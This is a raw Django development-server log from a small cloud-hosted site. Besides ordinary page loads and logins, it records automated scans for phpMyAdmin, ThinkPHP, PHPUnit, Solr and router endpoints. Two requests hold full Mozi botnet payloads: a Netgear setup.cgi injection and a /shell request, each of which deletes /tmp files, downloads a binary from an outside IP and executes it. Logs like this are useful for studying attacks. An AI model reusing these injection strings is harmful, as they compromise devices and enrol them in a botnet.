Watching for file changes with StatReloader
[08/Aug/2020 15:19:26] "GET / HTTP/1.1" 200 1833
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[10/Aug/2020 05:21:25] "GET / HTTP/1.0" 400 59959
[10/Aug/2020 05:41:47] "GET / HTTP/1.1" 200 5033
[10/Aug/2020 05:52:08] "GET / HTTP/1.1" 200 5033
Not Found: /w00tw00t.at.blackhats.romanian.anti-sec:)
[10/Aug/2020 07:48:12] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 2703
Not Found: /phpMyAdmin-2/scripts/setup.php
[10/Aug/2020 07:48:12] "GET /phpMyAdmin-2/scripts/setup.php HTTP/1.1" 404 2670
Not Found: /my/scripts/setup.php
[10/Aug/2020 07:48:12] "GET /my/scripts/setup.php HTTP/1.1" 404 2640
Not Found: /MyAdmin/scripts/setup.php
[10/Aug/2020 07:48:12] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 2655
Not Found: /PHPMYADMIN/scripts/setup.php
[10/Aug/2020 07:48:13] "GET /PHPMYADMIN/scripts/setup.php HTTP/1.1" 404 2664
Not Found: /db/scripts/setup.php
[10/Aug/2020 07:48:13] "GET /db/scripts/setup.php HTTP/1.1" 404 2640
Not Found: /dbadmin/scripts/setup.php
[10/Aug/2020 07:48:13] "GET /dbadmin/scripts/setup.php HTTP/1.1" 404 2655
Not Found: /myadmin/scripts/setup.php
[10/Aug/2020 07:48:13] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 2655
Not Found: /mysql/scripts/setup.php
[10/Aug/2020 07:48:14] "GET /mysql/scripts/setup.php HTTP/1.1" 404 2649
Not Found: /mysqladmin/scripts/setup.php
[10/Aug/2020 07:48:14] "GET /mysqladmin/scripts/setup.php HTTP/1.1" 404 2664
Not Found: /pHpMyAdMiN/scripts/setup.php
[10/Aug/2020 07:48:14] "GET /pHpMyAdMiN/scripts/setup.php HTTP/1.1" 404 2664
Not Found: /phpMyAdmin/scripts/setup.php
[10/Aug/2020 07:48:14] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 2664
Not Found: /phpadmin/scripts/setup.php
[10/Aug/2020 07:48:14] "GET /phpadmin/scripts/setup.php HTTP/1.1" 404 2658
Not Found: /phpmyadmin/scripts/setup.php
[10/Aug/2020 07:48:15] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 2664
Not Found: /sqladm/scripts/setup.php
[10/Aug/2020 07:48:15] "GET /sqladm/scripts/setup.php HTTP/1.1" 404 2652
Not Found: /sqladmin/scripts/setup.php
[10/Aug/2020 07:48:15] "GET /sqladmin/scripts/setup.php HTTP/1.1" 404 2658
Not Found: /phpmyadmin/scripts/db.init.php
[10/Aug/2020 07:48:15] "GET /phpmyadmin/scripts/db.init.php HTTP/1.1" 404 2670
Not Found: /phpMyAdmin/scripts/db.init.php
[10/Aug/2020 07:48:15] "GET /phpMyAdmin/scripts/db.init.php HTTP/1.1" 404 2670
Not Found: /MyAdmin/scripts/setup.php
[10/Aug/2020 07:48:16] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 2655
Not Found: /database/scripts/setup.php
[10/Aug/2020 07:48:16] "GET /database/scripts/setup.php HTTP/1.1" 404 2658
Not Found: /phpAdmin/scripts/setup.php
[10/Aug/2020 07:48:16] "GET /phpAdmin/scripts/setup.php HTTP/1.1" 404 2658
Not Found: /phpmyadmin1/scripts/setup.php
[10/Aug/2020 07:48:16] "GET /phpmyadmin1/scripts/setup.php HTTP/1.1" 404 2667
Not Found: /phpmyadmin2/scripts/setup.php
[10/Aug/2020 07:48:17] "GET /phpmyadmin2/scripts/setup.php HTTP/1.1" 404 2667
Not Found: /pma/scripts/setup.php
[10/Aug/2020 07:48:17] "GET /pma/scripts/setup.php HTTP/1.1" 404 2643
Not Found: /scripts/setup.php
[10/Aug/2020 07:48:17] "GET /scripts/setup.php HTTP/1.1" 404 2631
Not Found: /setup.php
[10/Aug/2020 07:48:17] "GET /setup.php HTTP/1.1" 404 2607
[10/Aug/2020 09:44:18] "GET / HTTP/1.1" 200 5033
[10/Aug/2020 09:45:25] "GET / HTTP/1.1" 200 5033
----------------------------------------
Exception happened during processing of request from ('192.35.168.250', 40578)
Traceback (most recent call last):
  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
    self.handle()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 172, in handle
    self.handle_one_request()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.8/socket.py", line 669, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[10/Aug/2020 11:51:45] "GET / HTTP/1.1" 200 5033
----------------------------------------
Exception happened during processing of request from ('192.35.168.250', 54610)
Traceback (most recent call last):
  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
    self.handle()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.8/socket.py", line 669, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[10/Aug/2020 11:51:45] "GET / HTTP/1.1" 200 5033
[10/Aug/2020 11:59:40] "GET / HTTP/1.1" 200 5033
----------------------------------------
Exception happened during processing of request from ('73.189.50.89', 49813)
Traceback (most recent call last):
  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
    self.handle()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.8/socket.py", line 669, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[10/Aug/2020 11:59:40] "GET / HTTP/1.1" 200 5033
[10/Aug/2020 13:02:05] "GET / HTTP/1.1" 200 5033
[10/Aug/2020 13:50:28] "GET / HTTP/1.1" 200 5033
Not Found: /config/getuser
[10/Aug/2020 14:10:02] "GET /config/getuser?index=0 HTTP/1.1" 404 2633
[10/Aug/2020 14:25:51] "GET / HTTP/1.1" 200 5033
[10/Aug/2020 14:31:01] "GET / HTTP/1.1" 200 5033
----------------------------------------
Exception happened during processing of request from ('89.249.2.67', 50891)
Traceback (most recent call last):
  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
    self.handle()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.8/socket.py", line 669, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[10/Aug/2020 14:37:29] "GET / HTTP/1.1" 200 5033
[10/Aug/2020 14:44:26] "GET / HTTP/1.1" 200 5033
Invalid HTTP_HOST header: 'hotlink.cc'. You may need to add 'hotlink.cc' to ALLOWED_HOSTS.
Bad Request: /
[10/Aug/2020 16:57:26] "GET / HTTP/1.1" 400 59109
[10/Aug/2020 17:14:05] "GET / HTTP/1.1" 200 5033
Not Found: /config/getuser
[10/Aug/2020 17:39:54] "GET /config/getuser?index=0 HTTP/1.1" 404 2633
[10/Aug/2020 17:49:52] "GET / HTTP/1.1" 200 5033
[10/Aug/2020 18:02:58] "GET / HTTP/1.1" 200 5033
[10/Aug/2020 19:49:26] "GET / HTTP/1.1" 200 5033
Not Found: /boaform/admin/formLogin
[10/Aug/2020 20:17:45] "POST /boaform/admin/formLogin HTTP/1.1" 404 2653
[10/Aug/2020 21:16:49] "GET / HTTP/1.1" 200 5033
Not Found: /boaform/admin/formLogin
[10/Aug/2020 22:11:45] "POST /boaform/admin/formLogin HTTP/1.1" 404 2653
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[10/Aug/2020 23:02:24] "GET / HTTP/1.0" 400 60080
[10/Aug/2020 23:40:01] "GET / HTTP/1.1" 200 5033
Not Found: /solr/admin/info/system
[10/Aug/2020 23:59:06] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 2657
[11/Aug/2020 00:17:30] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 5033
[11/Aug/2020 00:38:31] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 5033
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Aug/2020 00:48:36] "GET / HTTP/1.0" 400 59583
Invalid HTTP_HOST header: '0'. You may need to add '0' to ALLOWED_HOSTS.
Bad Request: /
[11/Aug/2020 00:48:43] "GET / HTTP/1.1" 400 58963
Not Found: /index.php
[11/Aug/2020 00:49:09] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 2727
Not Found: /config/getuser
[11/Aug/2020 01:18:47] "GET /config/getuser?index=0 HTTP/1.1" 404 2633
[11/Aug/2020 02:00:04] "GET / HTTP/1.1" 200 5033
[11/Aug/2020 02:23:37] "GET / HTTP/1.1" 200 5033
[11/Aug/2020 02:30:52] "GET / HTTP/1.1" 200 5033
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Aug/2020 03:08:13] "GET / HTTP/1.0" 400 60035
Not Found: /config/getuser
[11/Aug/2020 03:11:59] "GET /config/getuser?index=0 HTTP/1.1" 404 2633
[11/Aug/2020 04:45:12] "GET / HTTP/1.1" 200 5033
Not Found: /api/jsonws/invoke
[11/Aug/2020 05:20:11] "POST /api/jsonws/invoke HTTP/1.1" 404 2635
[11/Aug/2020 06:17:01] "GET / HTTP/1.1" 200 5033
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Aug/2020 07:18:11] "GET / HTTP/1.1" 200 5033
[11/Aug/2020 07:33:34] "GET / HTTP/1.1" 200 5033
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
Not Found: /boaform/admin/formLogin
[11/Aug/2020 08:29:28] "POST /boaform/admin/formLogin HTTP/1.1" 404 2653
[11/Aug/2020 08:34:00] "GET / HTTP/1.1" 200 5033
Not Found: /solr/admin/info/system
[11/Aug/2020 08:39:14] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 2657
[11/Aug/2020 08:42:52] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 5033
[11/Aug/2020 08:48:32] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 5033
Not Found: /index.php
[11/Aug/2020 08:50:25] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 2727
Not Found: /api/jsonws/invoke
[11/Aug/2020 09:50:27] "POST /api/jsonws/invoke HTTP/1.1" 404 2635
Not Found: /TP/public/index.php
[11/Aug/2020 10:47:17] "GET /TP/public/index.php HTTP/1.1" 404 2637
Not Found: /TP/index.php
[11/Aug/2020 10:47:17] "GET /TP/index.php HTTP/1.1" 404 2616
Not Found: /thinkphp/html/public/index.php
[11/Aug/2020 10:47:19] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 2670
Not Found: /html/public/index.php
[11/Aug/2020 10:47:19] "GET /html/public/index.php HTTP/1.1" 404 2643
Not Found: /public/index.php
[11/Aug/2020 10:47:20] "GET /public/index.php HTTP/1.1" 404 2628
Not Found: /TP/html/public/index.php
[11/Aug/2020 10:47:21] "GET /TP/html/public/index.php HTTP/1.1" 404 2652
Not Found: /elrekt.php
[11/Aug/2020 10:47:22] "GET /elrekt.php HTTP/1.1" 404 2610
Not Found: /index.php
[11/Aug/2020 10:47:25] "GET /index.php HTTP/1.1" 404 2607
[11/Aug/2020 10:47:25] "GET / HTTP/1.1" 200 5033
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[11/Aug/2020 12:19:21] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2733
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[11/Aug/2020 12:57:08] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2734
[11/Aug/2020 13:10:46] "GET / HTTP/1.1" 200 5033
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Aug/2020 13:19:49] "GET / HTTP/1.0" 400 59710
[11/Aug/2020 13:27:05] "GET / HTTP/1.1" 200 5033
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Aug/2020 14:35:50] "GET / HTTP/1.0" 400 59958
[11/Aug/2020 14:43:35] "GET / HTTP/1.1" 200 5033
Not Found: /boaform/admin/formLogin
[11/Aug/2020 15:00:02] "POST /boaform/admin/formLogin HTTP/1.1" 404 2653
[11/Aug/2020 15:04:59] "GET / HTTP/1.1" 200 5033
[11/Aug/2020 15:06:56] "GET / HTTP/1.1" 200 5033
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /setup.cgi
[11/Aug/2020 17:04:42] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.243.121.200:40533/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 400 61985
Not Found: /config/getuser
[11/Aug/2020 17:46:17] "GET /config/getuser?index=0 HTTP/1.1" 404 2633
[11/Aug/2020 18:10:00] "GET / HTTP/1.1" 200 5033
Not Found: /favicon.ico
[11/Aug/2020 18:10:01] "GET /favicon.ico HTTP/1.1" 404 2613
[11/Aug/2020 18:10:11] "GET /users/login/ HTTP/1.1" 200 2689
[11/Aug/2020 18:10:24] "POST /users/login/ HTTP/1.1" 302 0
Forbidden (CSRF token missing or incorrect.): /users/login/
[11/Aug/2020 18:10:29] "POST /users/login/ HTTP/1.1" 403 2513
[11/Aug/2020 18:10:56] "GET /users/login/ HTTP/1.1" 200 2671
[11/Aug/2020 18:10:59] "GET / HTTP/1.1" 200 5196
[11/Aug/2020 18:11:05] "GET /users/logout/ HTTP/1.1" 302 0
[11/Aug/2020 18:11:05] "GET / HTTP/1.1" 200 5033
[11/Aug/2020 18:11:06] "GET /users/login/ HTTP/1.1" 200 2689
[11/Aug/2020 18:11:13] "POST /users/login/ HTTP/1.1" 302 0
[11/Aug/2020 18:11:13] "GET / HTTP/1.1" 200 5196
[11/Aug/2020 18:34:51] "GET / HTTP/1.1" 200 5033
Not Found: /favicon.ico
[11/Aug/2020 18:34:51] "GET /favicon.ico HTTP/1.1" 404 2613
[11/Aug/2020 18:34:53] "GET /users/login/ HTTP/1.1" 200 2689
[11/Aug/2020 18:34:59] "POST /users/login/ HTTP/1.1" 302 0
[11/Aug/2020 18:35:00] "GET / HTTP/1.1" 200 5196
[11/Aug/2020 18:35:11] "GET /users/logout/ HTTP/1.1" 302 0
[11/Aug/2020 18:35:11] "GET / HTTP/1.1" 200 5033
[11/Aug/2020 18:35:13] "GET /users/login/ HTTP/1.1" 200 2689
[11/Aug/2020 18:35:20] "POST /users/login/ HTTP/1.1" 200 3000
[11/Aug/2020 18:35:28] "POST /users/login/ HTTP/1.1" 302 0
[11/Aug/2020 18:35:28] "GET / HTTP/1.1" 200 5196
Not Found: /phpmyadmin/
[11/Aug/2020 18:50:25] "GET /phpmyadmin/ HTTP/1.1" 404 2613
----------------------------------------
Exception happened during processing of request from ('171.12.177.173', 9622)
Traceback (most recent call last):
  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
    self.handle()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.8/socket.py", line 669, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[11/Aug/2020 19:03:06] "GET / HTTP/1.1" 200 5196
Not Found: /boaform/admin/formLogin
[11/Aug/2020 19:09:24] "POST /boaform/admin/formLogin HTTP/1.1" 404 2653
[11/Aug/2020 20:09:11] "GET / HTTP/1.1" 200 5033
Not Found: /config/getuser
[11/Aug/2020 20:19:07] "GET /config/getuser?index=0 HTTP/1.1" 404 2633
Not Found: /config/getuser
[11/Aug/2020 20:27:57] "GET /config/getuser?index=0 HTTP/1.1" 404 2633
[11/Aug/2020 20:42:14] "GET / HTTP/1.1" 200 5033
[11/Aug/2020 21:36:37] code 400, message Bad request version ('mk³"\\')
[11/Aug/2020 21:36:37] You're accessing the development server over HTTPS, but it only supports HTTP.

[11/Aug/2020 21:46:33] "GET / HTTP/1.1" 200 5033
Not Found: /webfig/
[11/Aug/2020 21:46:33] "GET /webfig/ HTTP/1.1" 404 2601
Invalid HTTP_HOST header: 'instance-4.us-central1-a.c.my-second-project-285813.internal'. You may need to add 'instance-4.us-central1-a.c.my-second-project-285813.internal' to ALLOWED_HOSTS.
Bad Request: /
[11/Aug/2020 21:51:47] "GET / HTTP/1.0" 400 60036
Not Found: /shell
[11/Aug/2020 22:05:58] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 2685
----------------------------------------
Exception happened during processing of request from ('171.95.85.98', 18846)
Traceback (most recent call last):
  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
    self.handle()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 174, in handle
    self.handle_one_request()
  File "/usr/local/lib/python3.8/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
    self.raw_requestline = self.rfile.readline(65537)
  File "/usr/lib/python3.8/socket.py", line 669, in readinto
    return self._sock.recv_into(b)
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[11/Aug/2020 23:01:34] "GET / HTTP/1.1" 200 5033
Not Found: /boaform/admin/formLogin
[11/Aug/2020 23:24:00] "POST /boaform/admin/formLogin HTTP/1.1" 404 2653
[11/Aug/2020 23:31:14] "GET / HTTP/1.1" 200 5033
Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
Bad Request: /cgi-bin/mainfunction.cgi
[11/Aug/2020 23:53:16] "POST /cgi-bin/mainfunction.cgi HTTP/1.1" 400 59671
[12/Aug/2020 00:13:12] "GET / HTTP/1.1" 200 5033
[12/Aug/2020 00:40:59] "GET / HTTP/1.1" 200 5033
Not Found: /config/getuser
[12/Aug/2020 01:00:44] "GET /config/getuser?index=0 HTTP/1.1" 404 2633
[12/Aug/2020 01:18:30] "GET / HTTP/1.1" 200 5033
Not Found: /solr/admin/info/system
[12/Aug/2020 01:41:24] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 2657
[12/Aug/2020 01:47:26] "GET / HTTP/1.1" 200 5033
[12/Aug/2020 01:54:57] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 5033
[12/Aug/2020 02:10:58] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 5033
Not Found: /index.php
[12/Aug/2020 02:18:08] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 2727
Not Found: /TP/public/index.php
[12/Aug/2020 02:44:37] "GET /TP/public/index.php HTTP/1.1" 404 2637
Not Found: /TP/index.php
[12/Aug/2020 02:44:37] "GET /TP/index.php HTTP/1.1" 404 2616
Not Found: /thinkphp/html/public/index.php
[12/Aug/2020 02:44:39] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 2670
Not Found: /html/public/index.php
[12/Aug/2020 02:44:39] "GET /html/public/index.php HTTP/1.1" 404 2643
Not Found: /public/index.php
[12/Aug/2020 02:44:40] "GET /public/index.php HTTP/1.1" 404 2628
Not Found: /TP/html/public/index.php
[12/Aug/2020 02:44:40] "GET /TP/html/public/index.php HTTP/1.1" 404 2652
Not Found: /elrekt.php
[12/Aug/2020 02:44:41] "GET /elrekt.php HTTP/1.1" 404 2610
Not Found: /index.php
[12/Aug/2020 02:44:42] "GET /index.php HTTP/1.1" 404 2607
[12/Aug/2020 02:44:43] "GET / HTTP/1.1" 200 5033
Not Found: /boaform/admin/formLogin
[12/Aug/2020 03:36:15] "POST /boaform/admin/formLogin HTTP/1.1" 404 2653
Not Found: /config/getuser
[12/Aug/2020 05:23:42] "GET /config/getuser?index=0 HTTP/1.1" 404 2633
Not Found: /api/jsonws/invoke
[12/Aug/2020 05:38:55] "POST /api/jsonws/invoke HTTP/1.1" 404 2635
